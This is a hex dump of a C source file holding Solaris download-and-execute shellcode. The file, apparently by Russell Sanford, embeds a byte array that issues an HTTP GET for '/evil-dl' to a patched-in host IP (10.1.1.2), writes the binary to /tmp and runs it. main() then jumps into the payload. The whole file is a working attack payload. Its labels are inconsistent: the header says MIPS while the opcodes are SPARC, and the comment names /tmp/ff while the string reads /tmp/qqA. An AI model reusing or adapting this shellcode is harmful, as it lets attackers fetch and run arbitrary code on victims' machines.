00000000  2f 2a 0d 0a 0d 0a 20 62  6c 61 63 6b 2d 64 6c 2d  |/*.... black-dl-|
00000010  65 78 65 63 2d 53 4f 4c  41 52 49 53 2e 63 20 28  |exec-SOLARIS.c (|
00000020  4d 49 50 53 29 20 20 5b  32 37 38 3a 62 79 74 65  |MIPS)  [278:byte|
00000030  73 5d 0d 0a 20 44 6f 77  6c 6f 61 64 73 20 61 20  |s].. Dowloads a |
00000040  62 69 6e 61 72 79 20 66  72 6f 6d 20 68 6f 73 74  |binary from host|
00000050  20 67 69 76 65 6e 20 6e  61 6d 65 64 20 27 65 76  | given named 'ev|
00000060  69 6c 2d 64 6c 27 20 74  6f 20 27 2f 74 6d 70 2f  |il-dl' to '/tmp/|
00000070  66 66 27 20 74 68 65 6e  20 65 78 65 63 75 74 65  |ff' then execute|
00000080  73 2e 0d 0a 20 31 31 2e  32 31 2e 36 20 20 52 75  |s... 11.21.6  Ru|
00000090  73 73 65 6c 6c 20 53 61  6e 66 6f 72 64 20 20 28  |ssell Sanford  (|
000000a0  78 6f 72 74 40 62 6c 61  63 6b 73 65 63 75 72 69  |xort@blacksecuri|
000000b0  74 79 2e 6f 72 67 29 0d  0a 0d 0a 20 67 63 63 20  |ty.org).... gcc |
000000c0  2d 6c 6e 73 6c 20 62 6c  61 63 6b 2d 64 6c 2d 65  |-lnsl black-dl-e|
000000d0  78 65 63 2d 53 4f 4c 41  52 49 53 2e 63 20 2d 6f  |xec-SOLARIS.c -o|
000000e0  20 62 64 65 73 0d 0a 0d  0a 2a 2f 0d 0a 0d 0a 23  | bdes....*/....#|
000000f0  69 6e 63 6c 75 64 65 20  3c 73 79 73 2f 73 6f 63  |include <sys/soc|
00000100  6b 65 74 2e 68 3e 0d 0a  23 69 6e 63 6c 75 64 65  |ket.h>..#include|
00000110  20 3c 6e 65 74 69 6e 65  74 2f 69 6e 2e 68 3e 0d  | <netinet/in.h>.|
00000120  0a 23 69 6e 63 6c 75 64  65 20 3c 61 72 70 61 2f  |.#include <arpa/|
00000130  69 6e 65 74 2e 68 3e 0d  0a 0d 0a 2f 2f 20 6f 70  |inet.h>....// op|
00000140  63 6f 64 65 20 65 6e 63  6f 64 69 6e 67 73 20 66  |code encodings f|
00000150  6f 72 20 70 65 72 66 6f  72 6d 69 6e 67 20 73 65  |or performing se|
00000160  74 68 69 2f 6f 72 20 61  67 61 69 6e 73 74 2f 69  |thi/or against/i|
00000170  6e 74 6f 20 72 65 67 69  73 74 65 72 20 25 6f 31  |nto register %o1|
00000180  20 77 2f 20 6e 75 6c 6c  65 64 20 64 61 74 61 0d  | w/ nulled data.|
00000190  0a 0d 0a 23 64 65 66 69  6e 65 20 53 45 54 48 49  |...#define SETHI|
000001a0  5f 4f 31 20 30 78 31 33  30 30 30 30 30 30 0d 0a  |_O1 0x13000000..|
000001b0  23 64 65 66 69 6e 65 20  4f 52 5f 4f 31 09 20 30  |#define OR_O1. 0|
000001c0  78 39 32 31 32 36 30 30  30 0d 0a 0d 0a 63 68 61  |x92126000....cha|
000001d0  72 20 64 6c 5f 65 78 65  63 5f 73 68 5b 5d 20 3d  |r dl_exec_sh[] =|
000001e0  0d 0a 22 5c 78 61 36 5c  78 31 61 5c 78 63 30 5c  |.."\xa6\x1a\xc0\|
000001f0  78 30 62 5c 78 32 30 5c  78 62 66 5c 78 66 66 5c  |x0b\x20\xbf\xff\|
00000200  78 66 66 5c 78 32 30 5c  78 62 66 5c 78 66 66 5c  |xff\x20\xbf\xff\|
00000210  78 66 66 5c 78 37 66 5c  78 66 66 5c 78 66 66 5c  |xff\x7f\xff\xff\|
00000220  78 66 66 5c 78 39 30 5c  78 31 30 5c 78 32 30 5c  |xff\x90\x10\x20\|
00000230  78 30 32 5c 78 39 32 5c  78 31 30 5c 78 32 30 5c  |x02\x92\x10\x20\|
00000240  78 30 32 22 0d 0a 22 5c  78 39 34 5c 78 31 61 5c  |x02".."\x94\x1a\|
00000250  78 38 30 5c 78 30 61 5c  78 39 36 5c 78 31 61 5c  |x80\x0a\x96\x1a\|
00000260  78 63 30 5c 78 30 62 5c  78 39 38 5c 78 31 30 5c  |xc0\x0b\x98\x10\|
00000270  78 32 30 5c 78 30 31 5c  78 38 32 5c 78 31 30 5c  |x20\x01\x82\x10\|
00000280  78 32 30 5c 78 65 36 5c  78 39 31 5c 78 64 30 5c  |x20\xe6\x91\xd0\|
00000290  78 32 30 5c 78 30 38 5c  78 63 30 5c 78 32 62 5c  |x20\x08\xc0\x2b\|
000002a0  78 65 30 5c 78 61 36 22  0d 0a 22 5c 78 64 30 5c  |xe0\xa6".."\xd0\|
000002b0  78 32 33 5c 78 62 66 5c  78 66 63 5c 78 39 32 5c  |x23\xbf\xfc\x92\|
000002c0  78 32 30 5c 78 33 66 5c  78 66 65 5c 78 39 33 5c  |x20\x3f\xfe\x93\|
000002d0  78 32 61 5c 78 36 30 5c  78 31 30 5c 78 39 32 5c  |x2a\x60\x10\x92\|
000002e0  78 32 32 5c 78 37 66 5c  78 62 30 5c 78 64 32 5c  |x22\x7f\xb0\xd2\|
000002f0  78 32 33 5c 78 62 66 5c  78 65 63 5c 78 31 33 5c  |x23\xbf\xec\x13\|
00000300  78 33 37 5c 78 61 62 5c  78 36 66 22 0d 0a 22 5c  |x37\xab\x6f".."\|
00000310  78 39 32 5c 78 31 32 5c  78 36 32 5c 78 65 66 5c  |x92\x12\x62\xef\|
00000320  78 64 32 5c 78 32 33 5c  78 62 66 5c 78 66 30 5c  |xd2\x23\xbf\xf0\|
00000330  78 63 30 5c 78 32 33 5c  78 62 66 5c 78 66 34 5c  |xc0\x23\xbf\xf4\|
00000340  78 39 32 5c 78 30 33 5c  78 62 66 5c 78 65 63 5c  |x92\x03\xbf\xec\|
00000350  78 39 34 5c 78 31 30 5c  78 32 30 5c 78 31 30 5c  |x94\x10\x20\x10\|
00000360  78 38 32 5c 78 31 30 5c  78 32 30 5c 78 65 62 22  |x82\x10\x20\xeb"|
00000370  0d 0a 22 5c 78 39 31 5c  78 64 30 5c 78 32 30 5c  |.."\x91\xd0\x20\|
00000380  78 30 38 5c 78 63 30 5c  78 32 62 5c 78 65 31 5c  |x08\xc0\x2b\xe1\|
00000390  78 30 65 5c 78 39 32 5c  78 30 33 5c 78 65 30 5c  |x0e\x92\x03\xe0\|
000003a0  78 66 63 5c 78 39 34 5c  78 32 30 5c 78 33 66 5c  |xfc\x94\x20\x3f\|
000003b0  78 66 32 5c 78 64 30 5c  78 30 33 5c 78 62 66 5c  |xf2\xd0\x03\xbf\|
000003c0  78 66 63 5c 78 38 32 5c  78 31 30 5c 78 32 30 5c  |xfc\x82\x10\x20\|
000003d0  78 30 34 22 0d 0a 22 5c  78 39 31 5c 78 64 30 5c  |x04".."\x91\xd0\|
000003e0  78 32 30 5c 78 30 38 5c  78 63 30 5c 78 32 62 5c  |x20\x08\xc0\x2b\|
000003f0  78 65 30 5c 78 66 62 5c  78 39 30 5c 78 30 33 5c  |xe0\xfb\x90\x03\|
00000400  78 65 30 5c 78 66 34 5c  78 39 34 5c 78 32 30 5c  |xe0\xf4\x94\x20\|
00000410  78 33 63 5c 78 31 33 5c  78 39 32 5c 78 32 30 5c  |x3c\x13\x92\x20\|
00000420  78 33 65 5c 78 66 65 5c  78 38 32 5c 78 31 30 5c  |x3e\xfe\x82\x10\|
00000430  78 32 30 5c 78 30 35 22  0d 0a 22 5c 78 39 31 5c  |x20\x05".."\x91\|
00000440  78 64 30 5c 78 32 30 5c  78 30 38 5c 78 64 30 5c  |xd0\x20\x08\xd0\|
00000450  78 32 33 5c 78 62 66 5c  78 66 38 5c 78 64 30 5c  |x23\xbf\xf8\xd0\|
00000460  78 30 33 5c 78 62 66 5c  78 66 63 5c 78 39 32 5c  |x03\xbf\xfc\x92\|
00000470  78 30 33 5c 78 62 66 5c  78 63 34 5c 78 39 34 5c  |x03\xbf\xc4\x94\|
00000480  78 31 30 5c 78 32 30 5c  78 31 34 5c 78 38 32 5c  |x10\x20\x14\x82\|
00000490  78 31 30 5c 78 32 30 5c  78 30 33 22 0d 0a 22 5c  |x10\x20\x03".."\|
000004a0  78 39 31 5c 78 64 30 5c  78 32 30 5c 78 30 38 5c  |x91\xd0\x20\x08\|
000004b0  78 61 34 5c 78 61 34 5c  78 63 30 5c 78 30 38 5c  |xa4\xa4\xc0\x08\|
000004c0  78 30 32 5c 78 38 30 5c  78 46 46 5c 78 30 36 5c  |x02\x80\xFF\x06\|
000004d0  78 39 34 5c 78 30 61 5c  78 33 66 5c 78 66 66 5c  |x94\x0a\x3f\xff\|
000004e0  78 64 30 5c 78 30 33 5c  78 62 66 5c 78 66 38 5c  |xd0\x03\xbf\xf8\|
000004f0  78 38 32 5c 78 31 30 5c  78 32 30 5c 78 30 34 22  |x82\x10\x20\x04"|
00000500  0d 0a 22 5c 78 39 31 5c  78 64 30 5c 78 32 30 5c  |.."\x91\xd0\x20\|
00000510  78 30 38 5c 78 31 30 5c  78 62 66 5c 78 66 66 5c  |x08\x10\xbf\xff\|
00000520  78 66 35 5c 78 39 34 5c  78 31 61 5c 78 38 30 5c  |xf5\x94\x1a\x80\|
00000530  78 30 61 5c 78 64 34 5c  78 32 33 5c 78 65 30 5c  |x0a\xd4\x23\xe0\|
00000540  78 66 63 5c 78 64 34 5c  78 32 33 5c 78 65 30 5c  |xfc\xd4\x23\xe0\|
00000550  78 66 30 5c 78 39 30 5c  78 30 33 5c 78 65 30 5c  |xf0\x90\x03\xe0\|
00000560  78 66 34 22 0d 0a 22 5c  78 64 30 5c 78 32 33 5c  |xf4".."\xd0\x23\|
00000570  78 65 30 5c 78 65 63 5c  78 39 32 5c 78 30 33 5c  |xe0\xec\x92\x03\|
00000580  78 65 30 5c 78 65 63 5c  78 38 32 5c 78 31 30 5c  |xe0\xec\x82\x10\|
00000590  78 32 30 5c 78 30 62 5c  78 39 31 5c 78 64 30 5c  |x20\x0b\x91\xd0\|
000005a0  78 32 30 5c 78 30 38 5c  78 36 66 5c 78 36 64 5c  |x20\x08\x6f\x6d\|
000005b0  78 36 36 5c 78 36 37 5c  78 32 30 5c 78 37 33 5c  |x66\x67\x20\x73\|
000005c0  78 36 66 5c 78 36 63 22  0d 0a 22 5c 78 36 31 5c  |x6f\x6c".."\x61\|
000005d0  78 37 32 5c 78 36 39 5c  78 37 33 5c 78 32 30 5c  |x72\x69\x73\x20\|
000005e0  78 37 33 5c 78 36 38 5c  78 36 35 5c 78 36 63 5c  |x73\x68\x65\x6c\|
000005f0  78 36 63 5c 78 36 33 5c  78 36 66 5c 78 36 34 5c  |x6c\x63\x6f\x64\|
00000600  78 36 35 5c 78 37 61 5c  78 32 31 5c 78 32 66 5c  |x65\x7a\x21\x2f\|
00000610  78 37 34 5c 78 36 64 5c  78 37 30 5c 78 32 66 5c  |x74\x6d\x70\x2f\|
00000620  78 37 31 5c 78 37 31 5c  78 34 31 22 0d 0a 22 5c  |x71\x71\x41".."\|
00000630  78 34 37 5c 78 34 35 5c  78 35 34 5c 78 32 30 5c  |x47\x45\x54\x20\|
00000640  78 32 66 5c 78 36 35 5c  78 37 36 5c 78 36 39 5c  |x2f\x65\x76\x69\|
00000650  78 36 63 5c 78 32 64 5c  78 36 34 5c 78 36 63 5c  |x6c\x2d\x64\x6c\|
00000660  78 30 61 5c 78 30 61 22  3b 20 0d 0a 0d 0a 0d 0a  |x0a\x0a"; ......|
00000670  76 6f 69 64 20 70 61 74  63 68 63 6f 64 65 28 6c  |void patchcode(l|
00000680  6f 6e 67 20 77 65 62 73  65 72 76 65 72 29 20 7b  |ong webserver) {|
00000690  0d 0a 0d 0a 09 2f 2f 20  66 69 78 20 73 65 74 68  |.....// fix seth|
000006a0  69 20 69 6e 73 74 72 75  63 74 69 6f 6e 20 74 6f  |i instruction to|
000006b0  20 73 65 74 20 75 70 20  69 70 2e 0d 0a 09 2a 28  | set up ip....*(|
000006c0  6c 6f 6e 67 20 2a 29 26  64 6c 5f 65 78 65 63 5f  |long *)&dl_exec_|
000006d0  73 68 5b 36 38 5d 20 3d  20 53 45 54 48 49 5f 4f  |sh[68] = SETHI_O|
000006e0  31 20 2b 20 28 28 77 65  62 73 65 72 76 65 72 29  |1 + ((webserver)|
000006f0  3e 3e 31 30 20 26 20 30  78 33 66 66 66 66 66 29  |>>10 & 0x3fffff)|
00000700  3b 0d 0a 0d 0a 09 2f 2f  20 46 49 58 20 6f 72 20  |;.....// FIX or |
00000710  69 6e 73 74 72 75 63 74  69 6f 6e 20 74 6f 20 73  |instruction to s|
00000720  65 74 20 75 70 20 69 70  2e 0d 0a 09 2a 28 6c 6f  |et up ip....*(lo|
00000730  6e 67 20 2a 29 26 64 6c  5f 65 78 65 63 5f 73 68  |ng *)&dl_exec_sh|
00000740  5b 37 32 5d 20 3d 20 4f  52 5f 4f 31 20 2b 20 28  |[72] = OR_O1 + (|
00000750  77 65 62 73 65 72 76 65  72 20 26 20 30 78 32 66  |webserver & 0x2f|
00000760  66 29 3b 0d 0a 7d 0d 0a  0d 0a 76 6f 69 64 20 28  |f);..}....void (|
00000770  2a 66 61 6b 65 66 75 6e  63 29 28 29 3b 0d 0a 0d  |*fakefunc)();...|
00000780  0a 76 6f 69 64 20 6d 61  69 6e 28 29 20 7b 0d 0a  |.void main() {..|
00000790  0d 0a 09 70 61 74 63 68  63 6f 64 65 28 69 6e 65  |...patchcode(ine|
000007a0  74 5f 61 64 64 72 28 22  31 30 2e 31 2e 31 2e 32  |t_addr("10.1.1.2|
000007b0  22 29 29 3b 0d 0a 09 63  68 61 72 20 2a 62 75 66  |"));...char *buf|
000007c0  66 65 72 20 3d 20 28 63  68 61 72 20 2a 29 20 6d  |fer = (char *) m|
000007d0  61 6c 6c 6f 63 28 31 30  32 34 29 3b 0d 0a 09 6d  |alloc(1024);...m|
000007e0  65 6d 63 70 79 28 62 75  66 66 65 72 2c 20 64 6c  |emcpy(buffer, dl|
000007f0  5f 65 78 65 63 5f 73 68  2c 20 32 38 30 29 3b 0d  |_exec_sh, 280);.|
00000800  0a 09 66 61 6b 65 66 75  6e 63 20 3d 20 62 75 66  |..fakefunc = buf|
00000810  66 65 72 3b 0d 0a 09 66  61 6b 65 66 75 6e 63 28  |fer;...fakefunc(|
00000820  29 3b 0d 0a 7d                                    |);..}|
00000825
